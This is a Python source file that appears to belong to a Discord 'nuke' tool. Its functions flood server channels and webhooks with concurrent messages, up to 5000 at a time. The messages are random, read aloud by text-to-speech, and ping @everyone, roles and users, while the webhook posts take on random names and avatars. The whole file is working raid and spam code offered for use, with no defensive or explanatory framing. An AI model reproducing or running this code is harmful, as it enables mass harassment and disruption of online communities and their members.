from __future__ import annotations

import logging
from asyncio import Semaphore, gather
from typing import Any

from nuke.config import rand_msg, rand_webhook_name
from nuke.profile import _avatar_cache

spam_sem = Semaphore(5000)


async def send(
    limiter: Any,
    guild_id: int,
    channel_id: str,
    headers: dict[str, str] | None = None,
) -> None:
    async with spam_sem:
        h = headers if headers is not None else {}
        try:
            await limiter.request(
                "POST",
                f"guilds:{guild_id}:msg:{channel_id}",
                f"https://discord.com/api/v10/channels/{channel_id}/messages",
                json={
                    "content": rand_msg(),
                    "allowed_mentions": {"parse": ["roles", "users", "everyone"]},
                    "tts": True,
                },
                headers=h,
            )
        except Exception as e:
            logging.warning(f"ch send {channel_id}: {e}")


async def _wh_spam(
    limiter: Any,
    wh: Any,
    headers: dict[str, str] | None = None,
) -> None:
    from nuke.webhooks import _clean_name

    async with spam_sem:
        h = headers if headers is not None else {}
        name = rand_webhook_name()
        name = _clean_name(name)
        av = _avatar_cache.get_any()
        payload: dict = {
            "content": rand_msg(),
            "allowed_mentions": {"parse": ["roles", "users", "everyone"]},
            "tts": True,
        }
        if name:
            payload["name"] = name
        if av:
            payload["avatar"] = av
        try:
            await limiter.request(
                "POST",
                f"webhooks:{wh.token}",
                f"https://discord.com/api/v10/webhooks/{wh.id}/{wh.token}",
                json=payload,
                headers=h,
            )
        except Exception as e:
            logging.warning(f"wh spam {wh.id}: {e}")


async def blast(
    limiter: Any,
    guild_id: int,
    webhooks: list,
    direct_ids: list[str],
    headers: dict[str, str] | None = None,
    session: Any = None,
) -> None:
    wh_tasks = [_wh_spam(limiter, w, headers) for w in webhooks]
    ch_tasks = [send(limiter, guild_id, cid, headers) for cid in direct_ids]
    await gather(*(wh_tasks + ch_tasks), return_exceptions=True)
